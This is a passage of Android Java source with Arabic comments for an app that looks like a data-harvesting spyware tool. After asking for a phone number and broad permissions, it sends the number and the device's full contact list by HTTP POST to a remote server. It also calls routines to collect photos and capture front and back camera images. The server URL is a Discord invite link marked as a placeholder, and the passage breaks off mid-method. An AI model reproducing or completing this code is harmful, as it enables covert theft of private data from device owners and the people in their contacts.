package com.yourpackage.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String SERVER_URL = "https://discord.gg/q2RQfEmGZ"; // ضع رابط سيرفرك هنا

    EditText phoneInput;
    Button startButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        phoneInput = findViewById(R.id.phoneInput);
        startButton = findViewById(R.id.startButton);

        // طلب الأذونات عند الضغط
        startButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestPermissions();
            }
        });
    }

    private void requestPermissions() {
        ArrayList<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.INTERNET);

        // تحويل ل array
        String[] permsArray = permissions.toArray(new String[0]);

        if (checkAndRequestPermissions(permsArray)) {
            // بدأ جمع البيانات
            String phone = phoneInput.getText().toString().trim();
            if (!phone.isEmpty()) {
                sendPhoneToServer(phone);
                collectContacts();
                collectPhotos();
                captureCamera("front");
                captureCamera("back");
            } else {
                Toast.makeText(this, "ادخل رقم الهاتف أولاً", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private boolean checkAndRequestPermissions(String[] permissions) {
        ArrayList<String> listPermissionsNeeded = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(perm);
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
            return false;
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    Toast.makeText(this, "تم رفض الإذن: " + permissions[i], Toast.LENGTH_SHORT).show();
                    return;
                }
            }
            // تم قبول كل الأذونات
            Toast.makeText(this, "بدأ جمع البيانات...", Toast.LENGTH_SHORT).show();
            // هنا نعيد تشغيل عملية الجمع
            startButton.performClick();
        }
    }

    // إرسال رقم الهاتف
    private void sendPhoneToServer(String phone) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String data = "action=save_phone&phone=" + phone;
                conn.getOutputStream().write(data.getBytes());
                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    // جمع جهات الاتصال
    private void collectContacts() {
        new Thread(() -> {
            StringBuilder contactsData = new StringBuilder();
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsData.append(name).append(": ").append(number).append("\n");
                }
                cursor.close();
            }
            // إرسال للسيرفر
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDo
